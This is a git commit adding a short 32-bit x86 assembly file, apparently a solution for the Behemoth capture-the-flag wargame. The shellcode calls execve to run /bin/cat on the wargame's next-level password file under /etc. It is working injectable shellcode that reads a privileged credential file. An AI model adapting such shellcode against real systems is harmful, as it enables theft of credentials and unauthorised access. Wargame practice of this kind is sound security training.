3d850f467d6342c8ebf5d02d9bdebe857eebf2aa
notsiddd <86549996+notsiddd@users.noreply.github.com>
2023-04-09 22:29:14 +0530

    Create shellCode.asm

---
+++ assignment2_Behemoth/shellCode.asm
@@ -0,0 +1,28 @@
+BITS 32
+ 
+xor eax, eax    ; the null byte
+push eax
+ 
+mov edx, esp    
+push "/cat"
+push "/bin"     
+mov ebx, esp    
+
+push eax        ; push "\0"
+push "oth1"     
+push "ehem"
+push "///b"
+push "pass"
+push "oth_"
+push "ehem"
+push "///b"
+push "/etc"     ; Creates "/etc///behemoth_pass///behemoth1\0"
+mov ebp, esp    
+ 
+push eax        
+push ebp        ; Pointer to "/etc///behemoth_pass///behemoth1\0"
+push ebx        
+mov ecx, esp    
+
+mov al, 11      ; execve("/bin/cat", (char*[]) {"/bin/cat", "/etc///behemoth_pass///behemoth1", NULL}, (char*[]) {NULL});
+int 0x80        
